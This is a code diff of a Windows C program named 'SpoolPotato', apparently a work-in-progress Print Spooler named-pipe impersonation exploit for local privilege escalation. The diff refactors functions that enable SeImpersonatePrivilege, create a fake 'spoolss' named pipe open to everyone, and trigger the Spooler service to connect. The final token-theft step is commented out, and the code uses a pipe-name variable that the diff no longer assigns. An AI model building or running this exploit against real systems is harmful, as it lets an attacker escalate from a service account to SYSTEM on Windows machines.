@@ -31,7 +31,7 @@ void DebugLog(const wchar_t* Format, ...) {
     va_list Args;
     wchar_t* pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
     va_start(Args, Format);
-    wvsprintf(pBuffer, Format, Args);
+    wvsprintfW(pBuffer, Format, Args);
     va_end(Args);
 #ifdef DLL_BUILD
 	uint32_t messageAnswer{};
@@ -102,11 +102,11 @@ BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
 					LUID_AND_ATTRIBUTES LuidAttributes = pTokenPrivileges->Privileges[dwX];
 					uint32_t dwPrivilegeNameLength = 0;
 
-					if (LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), NULL, (PDWORD)&dwPrivilegeNameLength) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+					if (!LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), NULL, (PDWORD)&dwPrivilegeNameLength) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
 						dwPrivilegeNameLength++; // Returned name length does not include NULL terminator
 						wchar_t *pCurrentPrivilegeName = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPrivilegeNameLength * sizeof(WCHAR));
 
-						if (!LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), pCurrentPrivilegeName, (PDWORD)&dwPrivilegeNameLength)) {
+						if (LookupPrivilegeNameW(NULL, &(LuidAttributes.Luid), pCurrentPrivilegeName, (PDWORD)&dwPrivilegeNameLength)) {
 							if (!_wcsicmp(pCurrentPrivilegeName, PrivilegeName)) {
 								TOKEN_PRIVILEGES TokenPrivs = { 0 };
 								TokenPrivs.PrivilegeCount = 1;
@@ -127,79 +127,66 @@ BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
 			HeapFree(GetProcessHeap(), 0, pTokenPrivileges);
 		}
 		else {
-			DEBUG("... failed to query required token information length from primary process token.");
+			DebugLog(L"... failed to query required token information length from primary process token.");
 		}
 
 		CloseHandle(hToken);
 	}
 	else {
-		DEBUG(L"... failed to open handle to primary token of the current process with query/modify permissions.");
+		DebugLog(L"... failed to open handle to primary token of the current process with query/modify permissions.");
 	}
 
 	return bResult;
 }
 
+////////
+////////
+// Spool named pipe manipulation logic
+////////
 
-BOOL GenerateRandomPipeName(LPWSTR* ppwszPipeName)
-{
-	UUID uuid = { 0 };
+BOOL CreateFakeSpoolPipe(HANDLE *phPipe, HANDLE *phEvent) {
+	UUID Uuid = { 0 };
 
-	if (UuidCreate(&uuid) != RPC_S_OK)
-		return FALSE;
+	if (UuidCreate(&Uuid) == RPC_S_OK) {
+		RPC_WSTR pUuidStr = NULL;
 
-	if (UuidToString(&uuid, (RPC_WSTR*)&(*ppwszPipeName)) != RPC_S_OK)
-		return FALSE;
+		if (UuidToStringW(&Uuid, &pUuidStr) == RPC_S_OK && pUuidStr != NULL) {
+			wchar_t FakePipeName[MAX_PATH + 1] = { 0 };
+			SECURITY_DESCRIPTOR Sd = { 0 };
+			SECURITY_ATTRIBUTES Sa = { 0 };
 
-	if (!*ppwszPipeName)
-		return FALSE;
+			_snwprintf_s(FakePipeName, MAX_PATH, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", pUuidStr);
+			DebugLog(L"... generate fake spool pipe name of %ws", FakePipeName);
 
-	return TRUE;
-}
+			if (InitializeSecurityDescriptor(&Sd, SECURITY_DESCRIPTOR_REVISION)) {
+				if (ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&Sa)->lpSecurityDescriptor), NULL)) {
+					DebugLog(L"Successfully converted string sec descriptor to sec desc");
+					
+					if ((*phPipe = CreateNamedPipeW(FakePipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &Sa)) != NULL) { // FILE_FLAG_OVERLAPPED allows for the creation of an async pipe
+						OVERLAPPED ol = { 0 };
 
-HANDLE CreateSpoolNamedPipe(LPWSTR pwszPipeName)
-{
-	HANDLE hPipe = NULL;
-	LPWSTR pwszPipeFullname = NULL;
-	SECURITY_DESCRIPTOR sd = { 0 };
-	SECURITY_ATTRIBUTES sa = { 0 };
+						*phEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
+						ol.hEvent = *phEvent;
 
-	pwszPipeFullname = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
-	if (!pwszPipeFullname)
-		return NULL;
-
-	StringCchPrintf(pwszPipeFullname, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", pwszPipeName);
-
-	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
-	{
-		DEBUG(L"InitializeSecurityDescriptor() failed. Error: %d\n", GetLastError());
-		free(pwszPipeFullname);
-		return NULL;
+						if (!ConnectNamedPipe(*phPipe, &ol)) {
+							if (GetLastError() == ERROR_IO_PENDING) {
+								DebugLog(L"... named pipe connection successful");
+								return TRUE;
+							}
+							else {
+								DebugLog(L"... named pipe connection failed with invalid error code");
+							}
+						}
+						else {
+							DebugLog(L"... named pipe connection succeeded while it should have failed with ERROR_IO_PENDING");
+						}
+					}
+				}
+			}
+		}
 	}
 
-	DEBUG(L"Successfully initialized security descriptor for named pipe");
-
-	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
-	{
-		DEBUG(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
-		free(pwszPipeFullname);
-		return NULL;
-	}
-
-
-	DEBUG(L"Successfully converted string sec descriptor to sec desc");
-	// The FILE_FLAG_OVERLAPPED flag is what allows us to create an async pipe.
-	hPipe = CreateNamedPipe(pwszPipeFullname, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
-	if (hPipe == INVALID_HANDLE_VALUE)
-	{
-		DEBUG(L"CreateNamedPipe() failed. Error: %d\n", GetLastError());
-		free(pwszPipeFullname);
-		return NULL;
-	}
-
-	DEBUG(L"Successfully created named pipe with full name of %ws\r\n", pwszPipeFullname);
-	free(pwszPipeFullname);
-
-	return hPipe;
+	return FALSE;
 }
 
 uint32_t SpoolPotato() {
@@ -209,65 +196,49 @@ uint32_t SpoolPotato() {
 	HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
 	uint32_t dwWait = 0;
 
-	if (!EnablePrivilege(SE_IMPERSONATE_NAME))
-	{
-		DEBUG(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
-		goto cleanup;
+	if (EnablePrivilege(SE_IMPERSONATE_NAME)) {
+		DebugLog(L"... successfully obtained %ws privilege", SE_IMPERSONATE_NAME);
+
+		if (CreateFakeSpoolPipe(&hSpoolPipe, &hSpoolPipeEvent)) {
+			DebugLog(L"... named pipe creation and connection successful.");
+			DebugLog(L"[+] Named pipe listening...\n");
+
+			if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName)))
+			{
+				DebugLog(L"[-] Failed to trigger the Spooler service.\n");
+				goto cleanup;
+			}
+			/*
+			dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
+			if (dwWait != WAIT_OBJECT_0)
+			{
+				DebugLog(L"[-] Operation failed or timed out.\n");
+				goto cleanup;
+			}
+
+			GetSystem(hSpoolPipe);
+			*/
+		cleanup:
+			if (hSpoolPipe)
+				CloseHandle(hSpoolPipe);
+			if (hSpoolPipeEvent)
+				CloseHandle(hSpoolPipeEvent);
+			if (hSpoolTriggerThread)
+				CloseHandle(hSpoolTriggerThread);
+		}
+		else {
+			DebugLog(L"... named pipe creation and connection failed");
+		}
 	}
-
-	DEBUG(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);
-	
-	if (!GenerateRandomPipeName(&pwszPipeName))
-	{
-		DEBUG(L"[-] Failed to generate a name for the pipe.\n");
-		goto cleanup;
+	else {
+		DebugLog(L"... failed to obtain %ws privilege", SE_IMPERSONATE_NAME);
 	}
-
-	DEBUG(L"Successfully generated random pipe name: %ws\r\n", pwszPipeName);
-
-	if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName)))
-	{
-		DEBUG(L"[-] Failed to create a named pipe.\n");
-		goto cleanup;
-	}
-
-	DEBUG(L"Successfully created named pipe");
-	/*
-	if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe)))
-	{
-		DEBUG(L"[-] Failed to connect the named pipe.\n");
-		goto cleanup;
-	}
-
-	DEBUG(L"[+] Named pipe listening...\n");
-
-	if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName)))
-	{
-		DEBUG(L"[-] Failed to trigger the Spooler service.\n");
-		goto cleanup;
-	}
-
-	dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
-	if (dwWait != WAIT_OBJECT_0)
-	{
-		DEBUG(L"[-] Operation failed or timed out.\n");
-		goto cleanup;
-	}
-
-	GetSystem(hSpoolPipe);
-	*/
-cleanup:
-	if (hSpoolPipe)
-		CloseHandle(hSpoolPipe);
-	if (hSpoolPipeEvent)
-		CloseHandle(hSpoolPipeEvent);
-	if (hSpoolTriggerThread)
-		CloseHandle(hSpoolTriggerThread);
 
 	return 0;
 }
 
 int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
+	//DebugLog(L"... SpoolPotato launched...");
 	SpoolPotato();
     return 0;
 }
